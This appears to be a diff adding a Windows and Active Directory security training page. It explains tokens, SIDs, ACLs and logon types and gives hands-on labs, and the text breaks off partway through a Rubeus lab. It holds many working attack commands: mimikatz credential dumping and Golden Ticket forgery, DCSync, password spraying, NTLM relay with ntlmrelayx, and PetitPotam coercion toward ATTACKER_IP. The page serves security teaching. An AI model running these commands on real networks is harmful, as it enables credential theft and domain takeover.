+            <li><strong>Token Source:</strong> Which package created it (e.g., "User32", "Advapi")</li>
+          </ul>
+
+          <h3>Token Manipulation APIs</h3>
+          <pre><code class="language-c">// Key Win32/NT API functions for token manipulation:
+
+// Open a process's token:
+OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
+
+// Duplicate token (create impersonation token from primary or vice versa):
+DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);
+
+// Create a new process with a different token:
+CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, L"cmd.exe", CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+// Create process as another user (needs credentials):
+CreateProcessWithLogonW(L"admin", L"CORP", L"Password1", LOGON_WITH_PROFILE, NULL, L"cmd.exe", 0, NULL, NULL, &si, &pi);
+
+// Impersonate using a token (thread-level):
+ImpersonateLoggedOnUser(hToken);  // Sets impersonation token on calling thread
+SetThreadToken(NULL, hToken);      // Alternative: set token directly
+
+// Assign primary token to new process:
+// Requires SeAssignPrimaryTokenPrivilege
+CreateProcessAsUser(hToken, NULL, L"cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+// Get token from named pipe client:
+ImpersonateNamedPipeClient(hPipe);  // After client connects, impersonate them
+OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken);  // Get the impersonation token</code></pre>
+
+          <h3>Restricted Tokens &amp; UAC Split Token</h3>
+          <ul>
+            <li><strong>Filtered (Split) Token:</strong> When admin logs in with UAC enabled, two tokens are created:
+              <ul>
+                <li>Full token: all groups + privileges (used by elevated processes)</li>
+                <li>Filtered token: admin groups set to DENY-ONLY, high privileges removed (used by default)</li>
+              </ul>
+            </li>
+            <li><strong>Restricted Tokens:</strong> Created with <code>CreateRestrictedToken()</code> — can disable SIDs, remove privileges, add restricting SIDs</li>
+            <li>Elevation (consent.exe / UAC prompt) switches from filtered to full token</li>
+          </ul>
+
+          <h3>Mandatory Integrity Control (MIC)</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Level</th><th>SID</th><th>Label</th><th>Applied To</th></tr></thead>
+            <tbody>
+              <tr><td>Untrusted</td><td>S-1-16-0</td><td>0x0000</td><td>Rare</td></tr>
+              <tr><td>Low</td><td>S-1-16-4096</td><td>0x1000</td><td>Browser sandbox processes, temp internet files</td></tr>
+              <tr><td>Medium</td><td>S-1-16-8192</td><td>0x2000</td><td>Standard user processes (default)</td></tr>
+              <tr><td>High</td><td>S-1-16-12288</td><td>0x3000</td><td>Elevated processes (Run as Administrator)</td></tr>
+              <tr><td>System</td><td>S-1-16-16384</td><td>0x4000</td><td>SYSTEM services, kernel objects</td></tr>
+              <tr><td>Protected Process</td><td>S-1-16-20480</td><td>0x5000</td><td>DRM, antimalware (PP/PPL)</td></tr>
+            </tbody>
+          </table>
+          <p><strong>No-Write-Up rule:</strong> A lower integrity process cannot write to higher integrity objects (even if DACL allows it). No-Read-Up and No-Execute-Up are optional.</p>
+
+          <hr>
+
+          <!-- SIDs -->
+          <h2>SIDs (Security Identifiers)</h2>
+
+          <h3>SID Format</h3>
+          <pre><code class="language-bash"># Format: S-R-X-Y1-Y2-Y3-RID
+# S     = literal "S"
+# R     = Revision (always 1)
+# X     = Identifier Authority (5 = NT Authority)
+# Y1-Y3 = Sub-authorities (domain identifier for domain SIDs)
+# RID   = Relative Identifier (unique within domain)
+#
+# Example: S-1-5-21-3623811015-3361044348-30300820-1013
+#          S-1-5-21-[-------domain identifier-------]-[RID]</code></pre>
+
+          <h3>Well-Known SIDs</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>SID</th><th>Name</th><th>Notes</th></tr></thead>
+            <tbody>
+              <tr><td>S-1-0-0</td><td>Nobody / Null SID</td><td>No security principal</td></tr>
+              <tr><td>S-1-1-0</td><td>Everyone</td><td>All users including anonymous</td></tr>
+              <tr><td>S-1-5-7</td><td>ANONYMOUS LOGON</td><td>Unauthenticated connections</td></tr>
+              <tr><td>S-1-5-11</td><td>Authenticated Users</td><td>All authenticated domain/local users</td></tr>
+              <tr><td>S-1-5-18</td><td>NT AUTHORITY\SYSTEM</td><td>Highest privilege local account</td></tr>
+              <tr><td>S-1-5-19</td><td>NT AUTHORITY\LOCAL SERVICE</td><td>Limited privileges, presents anonymous on network</td></tr>
+              <tr><td>S-1-5-20</td><td>NT AUTHORITY\NETWORK SERVICE</td><td>Limited privileges, presents machine account on network</td></tr>
+              <tr><td>S-1-5-32-544</td><td>BUILTIN\Administrators</td><td>Local Administrators group</td></tr>
+              <tr><td>S-1-5-32-545</td><td>BUILTIN\Users</td><td>Local Users group</td></tr>
+              <tr><td>S-1-5-32-551</td><td>BUILTIN\Backup Operators</td><td>Can back up/restore files regardless of DACL</td></tr>
+              <tr><td>S-1-5-32-555</td><td>BUILTIN\Remote Desktop Users</td><td>Allowed RDP access</td></tr>
+            </tbody>
+          </table>
+
+          <h3>Domain-Relative RIDs</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>RID</th><th>Account/Group</th></tr></thead>
+            <tbody>
+              <tr><td>500</td><td>Administrator (domain or local)</td></tr>
+              <tr><td>501</td><td>Guest</td></tr>
+              <tr><td>502</td><td>krbtgt</td></tr>
+              <tr><td>512</td><td>Domain Admins</td></tr>
+              <tr><td>513</td><td>Domain Users</td></tr>
+              <tr><td>514</td><td>Domain Guests</td></tr>
+              <tr><td>515</td><td>Domain Computers</td></tr>
+              <tr><td>516</td><td>Domain Controllers</td></tr>
+              <tr><td>518</td><td>Schema Admins</td></tr>
+              <tr><td>519</td><td>Enterprise Admins</td></tr>
+              <tr><td>520</td><td>Group Policy Creator Owners</td></tr>
+              <tr><td>521</td><td>Read-Only Domain Controllers</td></tr>
+              <tr><td>1000+</td><td>User-created accounts (auto-incremented)</td></tr>
+            </tbody>
+          </table>
+
+          <h3>SID History &amp; SID Filtering</h3>
+          <ul>
+            <li><strong>SID History:</strong> When a user migrates between domains, old SID is stored in <code>sIDHistory</code> attribute. Token includes SID history SIDs → user retains access to old domain resources.</li>
+            <li><strong>Attack:</strong> Inject Domain Admins SID from trusted domain into sIDHistory (Golden Ticket with extra SIDs) → cross-trust privilege escalation.</li>
+            <li><strong>SID Filtering:</strong> At trust boundaries, removes SIDs from other domains from the PAC. Prevents SID history abuse across forest trusts. Enabled by default on forest trusts, disabled by default on intra-forest trusts.</li>
+          </ul>
+          <pre><code class="language-powershell"># Check SID filtering status:
+Get-ADTrust -Filter * | Select Name,SIDFilteringForestAware,SIDFilteringQuarantined
+
+# Golden Ticket with SID History (cross-trust):
+# mimikatz:
+kerberos::golden /user:hacker /domain:child.corp.local /sid:S-1-5-21-CHILD /krbtgt:HASH /sids:S-1-5-21-PARENT-519 /ptt
+# The /sids parameter injects Enterprise Admins SID from parent domain</code></pre>
+
+          <h3>Machine Account SIDs</h3>
+          <ul>
+            <li>Computer objects have SIDs ending in their RID (e.g., <code>S-1-5-21-...-1105</code>)</li>
+            <li>Machine account name: <code>COMPUTERNAME$</code></li>
+            <li>Machine accounts are essentially service accounts — can authenticate, hold SPNs, have passwords (120+ char, rotated every 30 days automatically)</li>
+            <li>Any domain user can create up to 10 machine accounts by default (<code>ms-DS-MachineAccountQuota</code>)</li>
+          </ul>
+
+          <hr>
+
+          <!-- ACLs -->
+          <h2>ACLs / DACLs / SACLs</h2>
+
+          <h3>Security Descriptors</h3>
+          <p>Every securable object (file, registry key, AD object, service, process) has a Security Descriptor containing:</p>
+          <ul>
+            <li><strong>Owner:</strong> SID of the owner (can always modify DACL)</li>
+            <li><strong>Group:</strong> Primary group SID (mostly POSIX compat, rarely used in Windows)</li>
+            <li><strong>DACL (Discretionary ACL):</strong> Who can access and what they can do</li>
+            <li><strong>SACL (System ACL):</strong> Audit rules — what access attempts to log</li>
+            <li><strong>Control flags:</strong> SE_DACL_PRESENT, SE_DACL_PROTECTED (disables inheritance), SE_SACL_PRESENT, etc.</li>
+          </ul>
+
+          <h3>ACE Types</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>ACE Type</th><th>Purpose</th></tr></thead>
+            <tbody>
+              <tr><td>ACCESS_ALLOWED_ACE</td><td>Grants specified access rights to a SID</td></tr>
+              <tr><td>ACCESS_DENIED_ACE</td><td>Explicitly denies specified access rights to a SID</td></tr>
+              <tr><td>ACCESS_ALLOWED_OBJECT_ACE</td><td>Grants access to a specific property or extended right (AD objects — uses ObjectType GUID)</td></tr>
+              <tr><td>ACCESS_DENIED_OBJECT_ACE</td><td>Denies access to a specific property/right</td></tr>
+              <tr><td>SYSTEM_AUDIT_ACE</td><td>Generates audit event when specified access is attempted (in SACL)</td></tr>
+              <tr><td>SYSTEM_MANDATORY_LABEL_ACE</td><td>Defines integrity level of the object (in SACL)</td></tr>
+            </tbody>
+          </table>
+
+          <h3>ACE Evaluation Order</h3>
+          <ol>
+            <li>Explicit DENY ACEs (applied directly to object)</li>
+            <li>Explicit ALLOW ACEs</li>
+            <li>Inherited DENY ACEs</li>
+            <li>Inherited ALLOW ACEs</li>
+          </ol>
+          <p><strong>Key rule:</strong> Deny always takes precedence over Allow at the same inheritance level. Access check stops at first match for each requested permission.</p>
+
+          <h3>Inheritance &amp; Propagation Flags</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Flag</th><th>Meaning</th></tr></thead>
+            <tbody>
+              <tr><td>OBJECT_INHERIT_ACE (OI)</td><td>ACE inherited by child files/objects</td></tr>
+              <tr><td>CONTAINER_INHERIT_ACE (CI)</td><td>ACE inherited by child containers/folders</td></tr>
+              <tr><td>NO_PROPAGATE_INHERIT_ACE (NP)</td><td>Inheritance stops at first child level</td></tr>
+              <tr><td>INHERIT_ONLY_ACE (IO)</td><td>ACE doesn't apply to the object itself, only to children</td></tr>
+            </tbody>
+          </table>
+
+          <h3>Dangerous ACEs (AD Abuse)</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Right</th><th>Abuse</th></tr></thead>
+            <tbody>
+              <tr><td>GenericAll</td><td>Full control — reset password, modify membership, write any attribute</td></tr>
+              <tr><td>GenericWrite</td><td>Write any attribute — set SPN (Kerberoast targeted), modify msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)</td></tr>
+              <tr><td>WriteDACL</td><td>Modify the DACL — grant yourself GenericAll</td></tr>
+              <tr><td>WriteOwner</td><td>Change owner to yourself → then WriteDACL → GenericAll</td></tr>
+              <tr><td>ForceChangePassword</td><td>Reset user's password without knowing current password (extended right)</td></tr>
+              <tr><td>AllExtendedRights</td><td>Includes ForceChangePassword, DS-Replication-Get-Changes (DCSync)</td></tr>
+              <tr><td>AddMember (WriteProperty on "member")</td><td>Add yourself to a group (e.g., Domain Admins)</td></tr>
+              <tr><td>DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</td><td>DCSync — replicate password hashes from DC</td></tr>
+            </tbody>
+          </table>
+
+          <pre><code class="language-powershell"># Enumerate ACLs with PowerView:
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"}
+
+# Find interesting ACLs for current user:
+Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq "youruser"}
+
+# ACL abuse - WriteDACL → give yourself DCSync:
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity youruser -Rights DCSync
+
+# icacls for file system ACLs:
+icacls C:\SensitiveFolder
+# (OI)(CI)(F) = Full control, inherited to objects and containers</code></pre>
+
+          <h3>Auditing with SACLs</h3>
+          <ul>
+            <li>SACLs generate Windows Event Log entries (Security log) when specified access is attempted</li>
+            <li>Event ID 4656 = handle requested, 4663 = object accessed</li>
+            <li>Requires "Audit object access" policy enabled</li>
+            <li>Useful for detecting: DACL changes on sensitive groups, password resets, DCSync attempts</li>
+          </ul>
+
+          <hr>
+
+          <!-- LOGON TYPES -->
+          <h2>Logon Types</h2>
+
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Type</th><th>Name</th><th>Description</th><th>Credential Caching</th></tr></thead>
+            <tbody>
+              <tr><td>2</td><td>Interactive</td><td>Console logon, RunAs</td><td><strong>Yes</strong> — NT hash + Kerberos tickets in LSASS</td></tr>
+              <tr><td>3</td><td>Network</td><td>SMB, network share access, WinRM (without CredSSP)</td><td><strong>No</strong> — credentials NOT cached in LSASS (challenge-response only)</td></tr>
+              <tr><td>4</td><td>Batch</td><td>Scheduled tasks</td><td><strong>Yes</strong> — password stored by Task Scheduler, creds in LSASS during execution</td></tr>
+              <tr><td>5</td><td>Service</td><td>Service startup</td><td><strong>Yes</strong> — service account creds in LSASS</td></tr>
+              <tr><td>7</td><td>Unlock</td><td>Workstation unlock</td><td><strong>Yes</strong> — re-validates cached credentials</td></tr>
+              <tr><td>8</td><td>NetworkCleartext</td><td>IIS Basic auth, PowerShell with CredSSP</td><td><strong>Yes</strong> — cleartext password sent, cached</td></tr>
+              <tr><td>9</td><td>NewCredentials</td><td><code>runas /netonly</code></td><td><strong>Yes</strong> — new creds for network auth only, local access uses original token</td></tr>
+              <tr><td>10</td><td>RemoteInteractive</td><td>RDP (Terminal Services)</td><td><strong>Yes</strong> — full credential caching like Type 2</td></tr>
+              <tr><td>11</td><td>CachedInteractive</td><td>Logon with cached domain credentials (DC unreachable)</td><td>Uses cached DCC2 hash — original creds already stored</td></tr>
+            </tbody>
+          </table>
+
+          <h4>Critical Security Implications:</h4>
+          <ul>
+            <li><strong>Type 3 (Network):</strong> Does NOT cache credentials in LSASS → PtH to a machine won't leave your hash there → safer for lateral movement. This is why <code>psexec</code> uses network logon by default.</li>
+            <li><strong>Type 2/10 (Interactive/RDP):</strong> Caches everything → if attacker dumps LSASS on that machine, they get your credentials.</li>
+            <li><strong>Type 9 (NewCredentials):</strong> <code>runas /netonly /user:DOMAIN\admin cmd</code> — local access still as original user, but network connections use specified credentials. Useful for attackers with stolen creds.</li>
+          </ul>
+
+          <pre><code class="language-powershell"># Query logon events:
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} | 
+  Select-Object TimeCreated, @{N='LogonType';E={$_.Properties[8].Value}}, 
+  @{N='User';E={$_.Properties[5].Value}} | Format-Table
+
+# Logon type 3 (no cred caching):
+# Example tools that use network logon:
+# - PsExec (default) / Impacket's psexec.py
+# - CrackMapExec/NetExec
+# - WinRM / Evil-WinRM
+# - SMB share access
+
+# Logon type 10 (caches creds - dangerous):
+# - Standard RDP connection
+# - mstsc.exe
+# - xfreerdp, rdesktop</code></pre>
+
+          <hr>
+
+          <!-- TOOLS -->
+          <h2>Tools Reference</h2>
+
+          <h3>mimikatz</h3>
+          <pre><code class="language-bash"># Credential extraction:
+privilege::debug
+sekurlsa::logonpasswords          # All credentials from LSASS (NT hashes, Kerberos, wdigest)
+sekurlsa::msv                     # NT hashes only
+sekurlsa::kerberos                # Kerberos tickets (plaintext passwords if wdigest enabled)
+sekurlsa::wdigest                 # WDigest plaintext passwords
+sekurlsa::credman                 # Credential Manager stored creds
+sekurlsa::dpapi                   # DPAPI cached masterkeys
+
+# SAM / LSA:
+lsadump::sam                      # Local SAM database (NT hashes)
+lsadump::secrets                  # LSA secrets (service account passwords, machine account)
+lsadump::cache                    # Cached domain credentials (DCC2/mscash2)
+lsadump::dcsync /user:krbtgt     # DCSync - replicate specific user's hash from DC
+lsadump::dcsync /all /csv        # DCSync all accounts
+
+# Kerberos:
+kerberos::list                    # List cached tickets
+kerberos::ptt ticket.kirbi        # Pass-the-Ticket (inject into session)
+kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt  # Golden Ticket
+kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /target:srv01 /service:cifs /rc4:HASH /ptt  # Silver Ticket
+
+# Token:
+token::elevate                    # Impersonate SYSTEM token
+token::elevate /domainadmin       # Find and impersonate a Domain Admin token
+
+# Misc:
+misc::skeleton                    # Skeleton Key (patch LSASS for master password "mimikatz")</code></pre>
+
+          <h3>Rubeus</h3>
+          <pre><code class="language-bash"># Ticket operations:
+Rubeus.exe asktgt /user:svc_sql /rc4:HASH /ptt                    # Request TGT with hash
+Rubeus.exe asktgt /user:svc_sql /aes256:KEY /ptt /opsec           # Request TGT with AES (opsec)
+Rubeus.exe asktgs /ticket:BASE64 /service:cifs/srv01.corp.local   # Request TGS
+Rubeus.exe renew /ticket:BASE64                                    # Renew ticket
+Rubeus.exe describe /ticket:BASE64                                 # Decode ticket contents
+
+# Roasting:
+Rubeus.exe kerberoast /outfile:hashes.txt                          # Kerberoast all SPNs
+Rubeus.exe kerberoast /user:svc_sql /nowrap                        # Target specific user
+Rubeus.exe asreproast /user:nopreauth /nowrap                      # AS-REP roast specific user
+
+# Harvesting:
+Rubeus.exe harvest /interval:30                                    # Monitor for new TGTs
+Rubeus.exe triage                                                  # List all cached tickets
+Rubeus.exe dump                                                    # Dump all tickets (base64)
+Rubeus.exe dump /luid:0x3e7 /service:krbtgt                       # Dump specific ticket
+
+# Delegation:
+Rubeus.exe s4u /ticket:BASE64 /impersonateuser:admin /msdsspn:cifs/target /ptt   # S4U chain
+Rubeus.exe s4u /user:MACHINE$ /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target /altservice:http /ptt
+
+# Pass-the-Ticket:
+Rubeus.exe ptt /ticket:BASE64                                      # Inject ticket into session
+Rubeus.exe createnetonly /program:cmd.exe /show                    # Create process for PTT (logon type 9)
+
+# Ticket forgery:
+Rubeus.exe golden /rc4:KRBTGT_HASH /user:fakeadmin /id:500 /domain:corp.local /sid:S-1-5-21-... /ptt
+Rubeus.exe silver /rc4:SERVICE_HASH /user:fakeadmin /service:cifs/target /domain:corp.local /sid:S-1-5-21-... /ptt</code></pre>
+
+          <h3>Impacket</h3>
+          <pre><code class="language-bash"># Credential dumping:
+secretsdump.py corp.local/admin:pass@DC01                        # DCSync + SAM + LSA + cached
+secretsdump.py -hashes :HASH corp.local/admin@DC01               # With hash
+secretsdump.py -just-dc-ntlm corp.local/admin:pass@DC01         # Only NTLM hashes (fast)
+secretsdump.py -just-dc-user krbtgt corp.local/admin:pass@DC01  # Only krbtgt hash
+
+# Kerberos:
+getTGT.py corp.local/user:pass -dc-ip 10.10.10.1                # Get TGT → save as .ccache
+getST.py -spn cifs/target -impersonate admin corp.local/svc -hashes :HASH  # S4U
+GetNPUsers.py corp.local/ -usersfile users.txt -no-pass          # AS-REP roast
+GetUserSPNs.py corp.local/user:pass -request                    # Kerberoast
+
+# Ticket manipulation:
+ticketConverter.py ticket.kirbi ticket.ccache                     # Convert mimikatz → Impacket format
+ticketConverter.py ticket.ccache ticket.kirbi                     # Convert Impacket → mimikatz format
+export KRB5CCNAME=ticket.ccache                                   # Use .ccache file
+
+# Execution:
+psexec.py -k -no-pass corp.local/admin@target                   # Kerberos auth (uses ccache)
+wmiexec.py -k -no-pass corp.local/admin@target                  # WMI execution with Kerberos
+atexec.py corp.local/admin:pass@target "whoami"                  # Task Scheduler exec
+smbexec.py corp.local/admin:pass@target                          # SMB service exec</code></pre>
+
+          <h3>CrackMapExec / NetExec</h3>
+          <pre><code class="language-bash"># Authentication testing:
+nxc smb 192.168.1.0/24 -u admin -p 'Password1'               # Password spray
+nxc smb 192.168.1.0/24 -u admin -H HASH                      # Pass-the-Hash
+nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce  # User:pass pairs
+nxc winrm 192.168.1.100 -u admin -p 'Pass' -x "whoami"       # WinRM command exec
+
+# Enumeration:
+nxc smb 192.168.1.0/24 -u admin -H HASH --shares             # Enumerate shares
+nxc smb 192.168.1.0/24 -u admin -H HASH --users              # Enumerate users
+nxc smb 192.168.1.0/24 -u admin -H HASH --sessions           # Active sessions
+nxc smb DC01 -u admin -H HASH --ntds                         # Dump NTDS.dit via DCSync
+nxc ldap DC01 -u admin -p 'Pass' --kerberoast output.txt     # Kerberoast via LDAP
+
+# Credential extraction:
+nxc smb target -u admin -H HASH --sam                         # Dump SAM
+nxc smb target -u admin -H HASH --lsa                         # Dump LSA secrets
+nxc smb target -u admin -H HASH -M lsassy                    # Dump LSASS remotely
+nxc smb target -u admin -H HASH -M nanodump                  # MiniDump LSASS</code></pre>
+
+          <hr>
+
+        </div>
+
+        <!-- ==================== LABS TAB ==================== -->
+        <div class="tab-pane fade" id="labs" role="tabpanel">
+          <h2>Hands-On Labs</h2>
+
+          <div class="lab-card">
+            <h4>Lab 1: Examine Access Tokens</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">Objective: Understand Windows access token structure by examining your own token and comparing standard vs elevated processes.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Examine your current token
+whoami /all
+
+# Observe: User SID, Group SIDs, Privileges, Integrity Level
+
+# Step 2: Compare with elevated token
+# Open elevated PowerShell (Run as Administrator)
+whoami /all
+
+# Key differences:
+# - Mandatory Label: Medium vs High
+# - Privileges: SeDebugPrivilege, SeTakeOwnershipPrivilege (present in elevated)
+# - Group: BUILTIN\Administrators enabled (vs Deny-only in non-elevated)
+
+# Step 3: Use Process Explorer (Sysinternals)
+# Download: https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer
+# Double-click a process → Security tab → see full token details
+# Compare: explorer.exe (medium IL) vs elevated cmd.exe (high IL)
+
+# Step 4: Programmatic enumeration
+# PowerShell - list all privileges:
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Claims | 
+  Select-Object Type, Value | Format-Table
+
+# Step 5: View token with NtObjectManager:
+Install-Module NtObjectManager -Scope CurrentUser
+$token = Get-NtToken -Primary
+$token | Format-List User, Groups, Privileges, IntegrityLevel
+
+# Step 6: Identify split token (UAC):
+Get-NtToken -Primary -Linked  # Shows the other half of the split token</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 2: SID Enumeration and Well-Known SIDs</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">Objective: Enumerate SIDs in your environment, identify well-known SIDs, and understand RID allocation.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Get your SID:
+whoami /user
+# or
+[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+
+# Step 2: Translate SID to name and back:
+$sid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
+$sid.Translate([System.Security.Principal.NTAccount]).Value
+# Output: BUILTIN\Administrators
+
+# Name to SID:
+$account = New-Object System.Security.Principal.NTAccount("BUILTIN", "Administrators")
+$account.Translate([System.Security.Principal.SecurityIdentifier]).Value
+
+# Step 3: Enumerate all local accounts with RIDs:
+Get-LocalUser | Select Name, SID | Format-Table
+# Notice: Administrator=500, Guest=501, new users=1000+
+
+# Step 4: Enumerate domain SIDs (if domain-joined):
+Get-ADUser -Filter * -Properties SID | Select Name, SID | Sort-Object {[int]($_.SID -split '-')[-1]}
+
+# Step 5: Enumerate group SIDs:
+Get-ADGroup -Filter * -Properties SID | 
+  Select Name, @{N='RID';E={($_.SID -split '-')[-1]}} | 
+  Sort-Object {[int]$_.RID} | Format-Table
+
+# Step 6: Check group memberships via SIDs in your token:
+whoami /groups
+# Identify each SID: well-known vs domain-relative
+
+# Step 7: Machine SID:
+Get-ADComputer -Identity $env:COMPUTERNAME -Properties SID | Select SID</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 3: NTLM Authentication Capture with Responder</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Capture Net-NTLMv2 hashes using Responder by poisoning LLMNR/NBT-NS/mDNS queries on a lab network.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Environment: Kali Linux attacker + Windows victim on same subnet
+# NEVER run on production networks without authorization
+
+# Step 1: Start Responder (on Kali):
+sudo responder -I eth0 -dwPv
+# -d = DHCP poisoning
+# -w = WPAD proxy
+# -P = Force NTLM auth for WPAD
+# -v = Verbose
+
+# Step 2: Trigger NTLM auth from victim (Windows):
+# Option A: Access non-existent share (triggers LLMNR/NBNS):
+# On victim: \\nonexistent\share (in explorer or net use)
+
+# Option B: Use coercion tools:
+# PetitPotam (unauthenticated on old DCs):
+python3 PetitPotam.py ATTACKER_IP VICTIM_IP
+
+# Step 3: Observe captured hash in Responder output:
+# [SMB] NTLMv2-SSP Client   : 192.168.1.50
+# [SMB] NTLMv2-SSP Username : CORP\admin
+# [SMB] NTLMv2-SSP Hash     : admin::CORP:1122334455667788:A4F49C...
+
+# Step 4: Hashes saved to:
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
+
+# Step 5: Understand what happened:
+# 1. Victim queried "nonexistent" via DNS → failed
+# 2. Fell back to LLMNR multicast → Responder answered "I'm that host!"
+# 3. Victim initiated SMB connection to Responder
+# 4. Responder sent NTLM challenge → victim responded with Net-NTLMv2 hash
+
+# Step 6: Verify traffic with Wireshark:
+# Filter: llmnr or nbns or ntlmssp
+# Observe Type 1/2/3 messages in the SMB session</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 4: Crack Net-NTLMv2 with Hashcat</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Crack captured Net-NTLMv2 hashes from Responder using hashcat with various attack modes.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Step 1: Verify hash format:
+cat captured_hash.txt
+# Format: username::domain:ServerChallenge:NTProofStr:Blob
+# Example: admin::CORP:aabbccdd11223344:B5A2C...01010000...
+
+# Step 2: Basic dictionary attack (mode 5600 = NetNTLMv2):
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Step 3: Dictionary + rules (much more effective):
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Step 4: Combinator attack (combine two wordlists):
+hashcat -m 5600 -a 1 captured_hash.txt wordlist1.txt wordlist2.txt
+
+# Step 5: Mask attack (brute force with pattern):
+# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special
+hashcat -m 5600 -a 3 captured_hash.txt '?u?l?l?l?l?l?d?d?s'
+# Matches: Passw0rd!, Summer23#, etc.
+
+# Step 6: For comparison, crack an NT hash (mode 1000):
+hashcat -m 1000 nt_hash.txt /usr/share/wordlists/rockyou.txt
+# Much faster since it's just MD4(password)
+
+# Step 7: Show cracked passwords:
+hashcat -m 5600 captured_hash.txt --show
+
+# Performance note:
+# NetNTLMv2 (5600): ~2 GH/s on RTX 4090
+# NTLM/NT hash (1000): ~150 GH/s on RTX 4090
+# Net-NTLMv2 is slower to crack because of HMAC-MD5 iterations</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 5: NTLM Relay with ntlmrelayx</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Perform an NTLM relay attack to gain code execution or dump credentials on a target where SMB signing is not required.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Prerequisites:
+# - SMB signing NOT required on target (check: nxc smb TARGET --gen-relay-list relay.txt)
+# - Victim can be coerced to authenticate to attacker
+# - Victim's credentials have admin rights on target
+
+# Step 1: Identify relay targets (SMB signing disabled):
+nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
+# Only hosts with "signing:False" are valid targets
+
+# Step 2: Disable SMB and HTTP in Responder (ntlmrelayx handles these):
+sudo nano /etc/responder/Responder.conf
+# Set: SMB = Off, HTTP = Off
+
+# Step 3: Start Responder for poisoning:
+sudo responder -I eth0 -dwPv
+
+# Step 4: Start ntlmrelayx (different terminal):
+# Option A: Execute command
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\\relay_proof.txt"
+
+# Option B: Dump SAM hashes
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# Option C: Interactive SMB shell
+ntlmrelayx.py -tf targets.txt -smb2support -i
+# Connect: nc 127.0.0.1 11000
+
+# Option D: Relay to LDAP (for RBCD or ACL abuse):
+ntlmrelayx.py -t ldap://DC01 --delegate-access --escalate-user attacker
+
+# Step 5: Trigger authentication from victim:
+# Either wait for LLMNR poisoning or actively coerce:
+python3 PetitPotam.py ATTACKER_IP VICTIM_IP
+# or
+python3 printerbug.py corp.local/user:pass@VICTIM_IP ATTACKER_IP
+
+# Step 6: Observe relay success:
+# ntlmrelayx output shows: [*] Authenticating against smb://TARGET as CORP/ADMIN SUCCEED
+# SAM dump or command output follows
+
+# Step 7: Understanding the flow:
+# Victim → authenticates to Attacker (thinks it's legitimate server)
+# Attacker → forwards auth messages to Target
+# Target → grants access based on Victim's privileges
+# Attacker → executes commands/dumps creds with that session</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 6: Kerberos Ticket Request and Inspection with Rubeus</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Request, inspect, and manipulate Kerberos tickets using Rubeus to understand the ticket lifecycle and contents.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Run from a domain-joined Windows machine
+
+# Step 1: List current cached tickets:
+klist
+# or with Rubeus:
+Rubeus.exe triage
+
+# Step 2: Request a TGT explicitly:
+Rubeus.exe asktgt /user:$env:USERNAME /password:YourPassword /ptt
+# Observe: Encryption type, ticket lifetime, flags
+
+# Step 3: Request a service ticket:
+Rubeus.exe asktgs /ticket:BASE64_TGT /service:cifs/fileserver.corp.local /ptt
+
+# Step 4: Describe ticket contents:
+Rubeus.exe describe /ticket:BASE64_TICKET
+# Observe:
+# - ServiceName (SPN)
+# - ClientName (authenticated user)
+# - Start/End/RenewTill times
